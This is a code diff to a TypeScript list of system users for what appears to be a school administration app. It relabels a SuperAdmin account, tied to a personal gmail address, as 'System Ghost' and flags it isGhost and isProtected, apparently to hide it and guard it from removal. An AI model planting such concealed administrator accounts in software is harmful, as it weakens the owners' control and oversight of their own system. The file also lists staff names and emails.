@@ -17,7 +17,7 @@ const getPermissions = (role: SystemUser['role']) =>
   roleDefinitions.find((definition) => definition.role === role)?.permissions ?? []
 
 export const systemUsers: SystemUser[] = [
-  { id: 'usr-1', fullName: 'Gilbert Tuyambaze', email: 'gilberttuyambaze00@gmail.com', role: 'SuperAdmin', permissions: getPermissions('SuperAdmin'), status: 'active', department: 'Digital Operations' },
+  { id: 'usr-1', fullName: 'System Ghost', email: 'gilberttuyambaze00@gmail.com', role: 'SuperAdmin', permissions: getPermissions('SuperAdmin'), status: 'active', department: 'Digital Operations', isGhost: true, isProtected: true },
   { id: 'usr-2', fullName: 'Jane Mukamana', email: 'headmaster@nyagataress.edu.rw', role: 'Headmaster', permissions: getPermissions('Headmaster'), status: 'active', department: 'Leadership' },
   { id: 'usr-5', fullName: 'Alice Uwera', email: 'admissions.office@nyagataress.edu.rw', role: 'AdmissionsOfficer', permissions: getPermissions('AdmissionsOfficer'), status: 'active', department: 'Admissions' },
   { id: 'usr-3', fullName: 'Eric Habimana', email: 'teacher.math@nyagataress.edu.rw', role: 'Teacher', permissions: getPermissions('Teacher'), status: 'active', department: 'Academics' },
